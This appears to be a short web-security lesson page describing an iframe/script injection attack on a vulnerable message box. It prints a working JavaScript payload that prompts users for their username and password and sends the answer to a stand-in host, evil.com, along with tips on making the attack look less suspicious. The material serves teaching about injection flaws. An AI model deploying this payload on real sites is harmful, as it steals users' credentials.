[Video link](https://egghead.io/lessons/egghead-prompt-users-for-credentials-from-a-vulnerable-website-via-iframe-injection)

# Prompt Users for Credentials from a Vulnerable Website via iFrame Injection

Another time to put on our attackers hat!

On our malicious server, we can create hijack.html. T

```html
<script>
  const payload = prompt("Please enter your username and password");
  const img = new Image();
  img.src = `https://evil.com:666/hijack?payload=${payload}`;
</script>
<iframe hidden src="https://evil.com:666/steal.html"></iframe>
```

If we log in and paste this into our message box the user will be prompted again to enter in their username and password.

This prompt box declares where it is from, so we'd need to be cunning about what we called our site to allow this attack to be less suspicious.
